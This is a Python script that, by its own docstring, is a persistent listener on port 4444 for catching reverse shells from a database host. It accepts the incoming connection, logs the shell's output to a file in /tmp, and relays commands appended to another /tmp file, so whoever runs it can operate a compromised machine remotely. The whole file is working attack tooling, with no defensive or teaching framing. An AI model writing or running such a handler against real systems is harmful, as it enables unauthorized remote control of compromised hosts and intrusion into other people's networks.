#!/usr/bin/env python3
"""Persistent catcher on web:4444 for DB reverse shells."""
import socket
import threading
import time
import os

CMD = "/tmp/sys_cmds.txt"
OUT = "/tmp/sys_out.txt"
open(CMD, "w").write("")
open(OUT, "w").write("starting\n")

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4444))
s.listen(1)
open(OUT, "a").write("listen\n")
open("/tmp/sysready", "w").write("1")
c, a = s.accept()
open(OUT, "a").write(f"CONN {a}\n")
c.settimeout(1.0)


def recv_loop():
    with open(OUT, "ab") as f:
        while True:
            try:
                d = c.recv(8192)
            except socket.timeout:
                continue
            except Exception as e:
                f.write(f"\nrecv err {e}\n".encode())
                break
            if not d:
                f.write(b"\nclosed\n")
                break
            f.write(d)
            f.flush()


threading.Thread(target=recv_loop, daemon=True).start()
time.sleep(0.5)
try:
    banner = True
except Exception:
    pass

pos = 0
while True:
    try:
        data = open(CMD, "r", encoding="utf-8", errors="ignore").read()
    except Exception:
        time.sleep(0.3)
        continue
    if len(data) > pos:
        chunk = data[pos:]
        pos = len(data)
        for line in chunk.splitlines():
            line = line.strip("\r")
            if not line or line.startswith("#"):
                continue
            open(OUT, "a").write(f"\n>>> {line}\n")
            try:
                c.send((line + "\n").encode())
            except Exception as e:
                open(OUT, "a").write(f"send err {e}\n")
                raise SystemExit(1)
            time.sleep(0.3)
    time.sleep(0.4)
